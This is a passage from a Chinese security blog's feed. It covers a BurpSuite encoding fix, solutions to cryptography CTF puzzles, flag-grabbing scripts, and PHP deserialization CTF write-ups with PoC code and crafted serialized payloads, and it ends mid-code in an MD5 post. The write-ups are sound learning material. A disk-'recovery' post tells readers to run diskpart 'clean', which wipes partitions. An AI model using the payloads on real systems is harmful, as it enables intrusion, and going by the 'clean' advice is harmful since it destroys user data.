    <content type="html"><![CDATA[<p>在做测试的时候总是遇到response中文乱码的问题。Google很多解决方案都是仅仅只修改burp字体。可是有些时候单纯修改字体问题依然会存在。后来发现还需要设置burp编码，目前问题暂时得到解决，以下记录问题过程及解决详情，供有需之人。</p><a id="more"></a><h2 id="burpsuite-response返回中文乱码，像下面这样："><a href="#burpsuite-response返回中文乱码，像下面这样：" class="headerlink" title="burpsuite response返回中文乱码，像下面这样："></a>burpsuite response返回中文乱码，像下面这样：</h2><p><img src="1.jpg" alt></p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>设置User options——Display——HTTP Message Display的Font为中文字体，比如宋体、微软雅黑等。然后设置Character Sets为Use a specific character set:UTF-8(这里吐槽下，windows默认选择的是Recognize automatically based on message headers，Mac则默认就是UTF-8，当时没发现这点，一直以为是字体原因 =.=！)<br>具体可见下图：</p><p><img src="2.jpg" alt></p><h2 id="解决后的效果如下图："><a href="#解决后的效果如下图：" class="headerlink" title="解决后的效果如下图："></a>解决后的效果如下图：</h2><p><img src="3.jpg" alt></p><p>Happy，burpsuite中文乱码问题解决。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在做测试的时候总是遇到response中文乱码的问题。Google很多解决方案都是仅仅只修改burp字体。可是有些时候单纯修改字体问题依然会存在。后来发现还需要设置burp编码，目前问题暂时得到解决，以下记录问题过程及解决详情，供有需之人。&lt;/p&gt;
    
    </summary>
    
      <category term="软件安装与使用" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    
      <category term="Burpsuite" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Burpsuite/"/>
    
    
      <category term="工具" scheme="http://archimesan.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>西普实验吧-密码学</title>
    <link href="http://archimesan.me/2018/01/30/%E8%A5%BF%E6%99%AE%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    <id>http://archimesan.me/2018/01/30/西普实验吧-密码学/</id>
    <published>2018-01-30T08:49:12.000Z</published>
    <updated>2019-03-25T02:31:30.139Z</updated>
    
    <content type="html"><![CDATA[<p>西普实验吧-密码学题目学习</p><a id="more"></a><h2 id="这里没有key"><a href="#这里没有key" class="headerlink" title="这里没有key"></a>这里没有key</h2><p><img src="1_1.png" alt></p><p><img src="1_2.png" alt></p><p><img src="1_3.png" alt></p><h2 id="chinese-hacker"><a href="#chinese-hacker" class="headerlink" title="chinese hacker"></a>chinese hacker</h2><p><img src="2_1.png" alt></p><p><img src="2_2.png" alt></p><p>ubuntu系统，所以安装了一下mdbtools<br>sudo apt-get install mdbtools mdbtools-gmdb mdbtools-dev</p><p><img src="2_3.png" alt></p><p><img src="2_4.png" alt></p><p>并不是base64加密，是base32解密即可</p><h2 id="压缩的问题"><a href="#压缩的问题" class="headerlink" title="压缩的问题"></a>压缩的问题</h2><p><img src="3_1.png" alt></p><p><img src="3_2.png" alt></p><p><img src="3_3.png" alt></p><p><img src="3_4.png" alt></p><p>用该段代码作为解压密码即可。</p><p><img src="3_5.png" alt></p><h2 id="一段奇怪的代码"><a href="#一段奇怪的代码" class="headerlink" title="一段奇怪的代码"></a>一段奇怪的代码</h2><p><img src="4_1.png" alt></p><p><img src="4_2.png" alt></p><p><img src="4_3.png" alt></p><h2 id="最近在论证一个问题，到底是先有鸡还是先有蛋"><a href="#最近在论证一个问题，到底是先有鸡还是先有蛋" class="headerlink" title="最近在论证一个问题，到底是先有鸡还是先有蛋"></a>最近在论证一个问题，到底是先有鸡还是先有蛋</h2><p><img src="5_1.png" alt></p><p>电脑键盘解密– key</p><h2 id="最近听说刘翔离婚了"><a href="#最近听说刘翔离婚了" class="headerlink" title="最近听说刘翔离婚了"></a>最近听说刘翔离婚了</h2><p><img src="6_1.png" alt></p><p><img src="6_2.png" alt></p><h2 id="摩擦摩擦"><a href="#摩擦摩擦" class="headerlink" title="摩擦摩擦"></a>摩擦摩擦</h2><p><img src="7_1.png" alt></p><p>摩斯密码解密</p><p><img src="7_2.png" alt></p><h2 id="凯撒是罗马共和国杰出的军事统帅"><a href="#凯撒是罗马共和国杰出的军事统帅" class="headerlink" title="凯撒是罗马共和国杰出的军事统帅"></a>凯撒是罗马共和国杰出的军事统帅</h2><p><img src="8_1.png" alt></p><p>凯撒解密</p><p><img src="8_2.png" alt></p><h2 id="古典密码的安全性不高，但仍然十分美妙，请破译下面的密文"><a href="#古典密码的安全性不高，但仍然十分美妙，请破译下面的密文" class="headerlink" title="古典密码的安全性不高，但仍然十分美妙，请破译下面的密文"></a>古典密码的安全性不高，但仍然十分美妙，请破译下面的密文</h2><p><img src="9_1.png" alt></p><p><img src="9_2.png" alt></p><h2 id="数码管"><a href="#数码管" class="headerlink" title="数码管"></a>数码管</h2><p><img src="10_1.png" alt></p><p><img src="10_2.png" alt></p><p><img src="10_3.jpeg" alt></p><p><img src="10_4.jpeg" alt></p><p><img src="10_5.jpeg" alt></p><h2 id="一个img文件"><a href="#一个img文件" class="headerlink" title="一个img文件"></a>一个img文件</h2><p>太麻烦不想弄</p><h2 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h2><p><img src="11_1.png" alt></p><p>BHUK,LP TGBNHGYT BHUK,LP UYGBN TGBNHGYT BHUK,LP BHUK,LP TGBNHGYT BHUK,LP TGBNHGYT UYGBN<br>提示键盘了，按照给出的字母顺序在键盘上画出字母的形状，就是答案</p><h2 id="密文-rot13"><a href="#密文-rot13" class="headerlink" title="密文 rot13"></a>密文 rot13</h2><p><img src="12_1.png" alt></p><p>先rot13再md5</p><p><img src="12_2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;西普实验吧-密码学题目学习&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://archimesan.me/categories/CTF/"/>
    
      <category term="实验吧" scheme="http://archimesan.me/categories/CTF/%E5%AE%9E%E9%AA%8C%E5%90%A7/"/>
    
    
      <category term="实验吧" scheme="http://archimesan.me/tags/%E5%AE%9E%E9%AA%8C%E5%90%A7/"/>
    
  </entry>
  
  <entry>
    <title>磁盘分区恢复</title>
    <link href="http://archimesan.me/2017/12/29/%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA%E6%81%A2%E5%A4%8D/"/>
    <id>http://archimesan.me/2017/12/29/磁盘分区恢复/</id>
    <published>2017-12-29T03:31:16.000Z</published>
    <updated>2019-03-25T02:29:07.286Z</updated>
    
    <content type="html"><![CDATA[<p>利用window自带的cmd命令恢复磁盘分区</p><a id="more"></a><h1 id="按windows键，右键点击运行，再左键点击以管理员身份运行"><a href="#按windows键，右键点击运行，再左键点击以管理员身份运行" class="headerlink" title="按windows键，右键点击运行，再左键点击以管理员身份运行"></a>按windows键，右键点击运行，再左键点击以管理员身份运行</h1><h3 id="输入diskpart-按enter"><a href="#输入diskpart-按enter" class="headerlink" title="输入diskpart,按enter"></a>输入diskpart,按enter</h3><p><img src="1.png" alt></p><h3 id="输入list-disk-按enter"><a href="#输入list-disk-按enter" class="headerlink" title="输入list disk,按enter"></a>输入list disk,按enter</h3><p><img src="2.png" alt></p><h3 id="输入select-disk-X-X代表磁盘后面的数字0、1，可磁盘的大小来判断数字是多少-按enter"><a href="#输入select-disk-X-X代表磁盘后面的数字0、1，可磁盘的大小来判断数字是多少-按enter" class="headerlink" title="输入select disk X(X代表磁盘后面的数字0、1，可磁盘的大小来判断数字是多少)按enter"></a>输入select disk X(X代表磁盘后面的数字0、1，可磁盘的大小来判断数字是多少)按enter</h3><p>选择后输入clean</p><p><img src="3.png" alt></p><p>搞定。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;利用window自带的cmd命令恢复磁盘分区&lt;/p&gt;
    
    </summary>
    
      <category term="经验分享" scheme="http://archimesan.me/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"/>
    
      <category term="磁盘" scheme="http://archimesan.me/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/%E7%A3%81%E7%9B%98/"/>
    
    
      <category term="磁盘" scheme="http://archimesan.me/tags/%E7%A3%81%E7%9B%98/"/>
    
  </entry>
  
  <entry>
    <title>快速抓取网页内容</title>
    <link href="http://archimesan.me/2017/12/28/%E5%BF%AB%E9%80%9F%E6%8A%93%E5%8F%96%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9/"/>
    <id>http://archimesan.me/2017/12/28/快速抓取网页内容/</id>
    <published>2017-12-28T07:11:36.000Z</published>
    <updated>2019-03-25T03:05:00.504Z</updated>
    
    <content type="html"><![CDATA[<p>python 快速抓取网页内容 </p><a id="more"></a><h1 id="两道例题"><a href="#两道例题" class="headerlink" title="两道例题"></a>两道例题</h1><h2 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h2><p><img src="1.png" alt></p><p>python 代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests,re</span><br><span class="line">from base64 import b64decode</span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web6/'</span></span><br><span class="line">r = s.get(url)</span><br><span class="line">head = r.headers</span><br><span class="line">flag = b64decode(head[<span class="string">'flag'</span>]).split(<span class="string">':'</span>)[1]</span><br><span class="line">flag = b64decode(‘flag’)</span><br><span class="line">r1 = s.post(url, data=&#123;<span class="string">'margin'</span>:flag&#125;)</span><br><span class="line"><span class="built_in">print</span> r1.text</span><br></pre></td></tr></table></figure></p><h2 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h2><p><img src="2.png" alt></p><p>python 代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests,re</span><br><span class="line">from base64 import b64decode</span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/10/10.php'</span></span><br><span class="line">r = s.get(url)</span><br><span class="line">head = r.headers</span><br><span class="line">flag = b64decode(head[<span class="string">'flag'</span>]).split(<span class="string">':'</span>)[1]</span><br><span class="line">r1 = s.post(url, data=&#123;<span class="string">'key'</span>:flag&#125;)</span><br><span class="line"><span class="built_in">print</span> r1.text</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;python 快速抓取网页内容 &lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://archimesan.me/categories/CTF/"/>
    
      <category term="Web" scheme="http://archimesan.me/categories/CTF/Web/"/>
    
    
      <category term="python" scheme="http://archimesan.me/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>序列化漏洞</title>
    <link href="http://archimesan.me/2017/12/25/%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://archimesan.me/2017/12/25/序列化漏洞/</id>
    <published>2017-12-25T11:45:54.000Z</published>
    <updated>2019-03-25T03:05:10.856Z</updated>
    
    <content type="html"><![CDATA[<p>几个序列号漏洞的例子。</p><a id="more"></a><h2 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h2><p>神盾局的秘密</p><p>看下逻辑<br>看源码发现了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> width=<span class="string">"100%"</span>/&gt;</span><br></pre></td></tr></table></figure></p><p>这里有个文件包含，base64 解码之后得到 shield.jpg</p><p>尝试读取 index.php</p><p><img src="1_4.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    require_once(<span class="string">'shield.php'</span>);</span><br><span class="line">    <span class="variable">$x</span> = new Shield();</span><br><span class="line">    isset(<span class="variable">$_GET</span>[<span class="string">'class'</span>]) &amp;&amp; <span class="variable">$g</span> = <span class="variable">$_GET</span>[<span class="string">'class'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!empty(<span class="variable">$g</span>)) &#123;</span><br><span class="line">        <span class="variable">$x</span> = unserialize(<span class="variable">$g</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$x</span>-&gt;readfile();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>利用同样的方法读取 shield.php</p><p><img src="1_4.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //flag is <span class="keyword">in</span> pctf.php</span><br><span class="line">    class Shield &#123;</span><br><span class="line">        public <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">function</span> __construct(<span class="variable">$filename</span> = <span class="string">''</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span> -&gt; file = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">readfile</span></span>() &#123;</span><br><span class="line">            <span class="keyword">if</span> (!empty(<span class="variable">$this</span>-&gt;file) &amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'..'</span>)===FALSE  </span><br><span class="line">            &amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'/'</span>)===FALSE &amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'\\'</span>)==FALSE) &#123;</span><br><span class="line">                <span class="built_in">return</span> @file_get_contents(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>最简单的序列化漏洞<br>直接利用脚本生成序列化的值<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //flag is <span class="keyword">in</span> pctf.php</span><br><span class="line">    class Shield &#123;</span><br><span class="line">        public <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">function</span> __construct(<span class="variable">$filename</span> = <span class="string">''</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span> -&gt; file = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">readfile</span></span>() &#123;</span><br><span class="line">            <span class="keyword">if</span> (!empty(<span class="variable">$this</span>-&gt;file) &amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'..'</span>)===FALSE  </span><br><span class="line">            &amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'/'</span>)===FALSE &amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'\\'</span>)==FALSE) &#123;</span><br><span class="line">                <span class="built_in">return</span> @file_get_contents(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$q</span> = new Shield();</span><br><span class="line"><span class="variable">$q</span>-&gt;file = <span class="string">'pctf.php'</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$q</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>或者：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //flag is <span class="keyword">in</span> pctf.php</span><br><span class="line">    class Shield &#123;</span><br><span class="line">        public <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">function</span> __construct(<span class="variable">$filename</span> = <span class="string">''</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span> -&gt; file = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$q</span> = new Shield();</span><br><span class="line"><span class="variable">$q</span>-&gt;file = <span class="string">'pctf.php'</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$q</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>payload 如下：</p><p><img src="1_3.png" alt></p><p><img src="1_4.png" alt></p><h2 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h2><p>源代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var <span class="variable">$enter</span>;</span><br><span class="line">    var <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'pass'</span>])) &#123;</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">'pass'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        <span class="variable">$pass</span>=stripslashes(<span class="variable">$pass</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$o</span>) &#123;</span><br><span class="line">        <span class="variable">$o</span>-&gt;secret = <span class="string">"*"</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$o</span>-&gt;secret === <span class="variable">$o</span>-&gt;enter)</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"Congratulation! Here is my secret: "</span>.<span class="variable">$o</span>-&gt;secret;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"Oh no... You can't fool me"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">echo</span> <span class="string">"are you trolling?"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>分析：<br>一个序列化过后的字符串与类中的变量始终保持相同，可以想到引用 a=&amp;b<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">poc：</span><br><span class="line">    &lt;?php   </span><br><span class="line">    class just4fun &#123;  </span><br><span class="line">        var <span class="variable">$enter</span>;  </span><br><span class="line">        var <span class="variable">$secret</span>;  </span><br><span class="line">        <span class="keyword">function</span> just4fun()  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="variable">$this</span>-&gt;enter=&amp;<span class="variable">$this</span>-&gt;secret;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="built_in">echo</span> serialize(new just4fun());  </span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure></p><p>输出：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:<span class="string">"just4fun"</span>:2:&#123;s:5:<span class="string">"enter"</span>;N;s:6:<span class="string">"secret"</span>;R:2;&#125;</span><br></pre></td></tr></table></figure></p><p>payload：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass=O:8:<span class="string">"just4fun"</span>:2:&#123;s:5:<span class="string">"enter"</span>;N;s:6:<span class="string">"secret"</span>;R:2;&#125;</span><br></pre></td></tr></table></figure></p><h2 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h2><p><img src="3_1.png" alt></p><p><img src="3_2.png" alt></p><p>点击没反应 根据提示加上 ?hint=1 发现源码</p><p><img src="3_3.png" alt></p><p>源码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include_once(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">'ISecer'</span>];</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'hint'</span>]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">elseif (unserialize(<span class="variable">$cookie</span>) === <span class="string">"<span class="variable">$KEY</span>"</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"<span class="variable">$flag</span>"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$KEY</span>=<span class="string">'ISecer:www.isecer.com'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>分析：这题很奇怪<br>要传一个 cookie 名为 ISecer 的反序列的值。并且反序列后的值要全相等于 ”$KEY”<br>这里要注意是有双引号。<br>而且$KEY的传值是在此之后的。所以反序列的值不是 ’ISecer:<a href="http://www.isecer.com’。难道一开始" target="_blank" rel="noopener">www.isecer.com’。难道一开始</a> $key 的值是 “”???<br>我们要得到的值是 string(0) “” 所以序列化该值即可。</p><p><img src="3_4.png" alt></p><h2 id="题目4"><a href="#题目4" class="headerlink" title="题目4"></a>题目4</h2><p>bool 绕过</p><p><img src="4_1.png" alt></p><p><img src="4_2.png" alt></p><p>点击”登录”没反应，右击查看源代码，发现这么一段：</p><p><img src="4_3.png" alt></p><p>这里说明要为用户名传入一个字符串，并且它经过md5加密后要等于 0。<br>在某些情况下，PHP 会把类数值数据（如含有数字的字符串等）转换成数值处理，== 运算符就是其中之一。在使用 == 运算符对两个字符串进行松散比较时，PHP会把类数值的字符串转换为数值进行比较，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。比如: ‘3’ == ‘3ascasd’ 结果为 true。<br>因此只要找到一个字串加密后第一个字符为0即可，这里提供几个：240610708，aabg7XSs，aabC9RqS<br>在用户名处输入以上其中一个字符串，提交后出现提示： /user.php?fame=hjkleffifer</p><p>访问得到源代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$unserialize_str</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="variable">$data_unserialize</span> = unserialize(<span class="variable">$unserialize_str</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data_unserialize</span>[<span class="string">'user'</span>] == <span class="string">'???'</span> &amp;&amp; <span class="variable">$data_unserialize</span>[<span class="string">'pass'</span>]==<span class="string">'???'</span>)&#123;</span><br><span class="line">print_r(<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>分析：<br>代码意思是把 post 提交的 password 值经过”反序列化”得到一个数组，要求数组里的 user 和 pass 都等于某个值时就打印 flag。<br>但是我们不知道两处 ??? 到底是什么，因此无法考虑用 php 函数构造这样的值。<br>别忘了还有一个提示： “伟大的科学家 php 方言道：成也布尔，败也布尔” ，bool 类型的 true 跟任意字符串可以弱类型相等。因此我们可以构造 bool 类型的序列化数据 ，无论比较的值是什么，结果都为true。（a 代表 array，s代表 string，b 代表 bool，而数字代表个数/长度）</p><p>构造 password 值为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:4:<span class="string">"user"</span>;b:1;s:4:<span class="string">"pass"</span>;b:1;&#125;</span><br></pre></td></tr></table></figure></p><p>在密码栏中提交构造的值，即可获取 flag: ctf{dwduwkhduw5465}</p><p><img src="4_4.png" alt></p><p><img src="4_5.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;几个序列号漏洞的例子。&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://archimesan.me/categories/CTF/"/>
    
      <category term="Web" scheme="http://archimesan.me/categories/CTF/Web/"/>
    
    
      <category term="序列化" scheme="http://archimesan.me/tags/%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>MD5 爆破问题</title>
    <link href="http://archimesan.me/2017/12/24/MD5%E7%88%86%E7%A0%B4%E9%97%AE%E9%A2%98/"/>
    <id>http://archimesan.me/2017/12/24/MD5爆破问题/</id>
    <published>2017-12-24T12:18:20.000Z</published>
    <updated>2019-03-25T03:08:00.095Z</updated>
    
    <content type="html"><![CDATA[<p>几道 MD5 爆破问题</p><a id="more"></a><h2 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h2><p>md5多一位</p><p><img src="1_1.png" alt></p><p>代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mymd5=<span class="string">"d78b6f302l25cdc811adfe8d4e7c9fd34"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(33):</span><br><span class="line">    newmd5=mymd5[:i]+mymd5[i+1:]</span><br><span class="line">    <span class="built_in">print</span> newmd5</span><br></pre></td></tr></table></figure></p><p>难道是逐个解密？？</p><p>不对。</p><p>MD5 包含0-9a-f共16个字符，不存在 l </p><p>很明显应该去掉 l </p><p>对 “d78b6f30225cdc811adfe8d4e7c9fd34” 进行解密即可。</p><p><img src="1_2.png" alt></p><h2 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h2><p>代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">def <span class="built_in">test</span>():</span><br><span class="line">    count=0</span><br><span class="line">    md5=<span class="string">'38e4c352809e150186920aac37190cbc'</span></span><br><span class="line">    str=<span 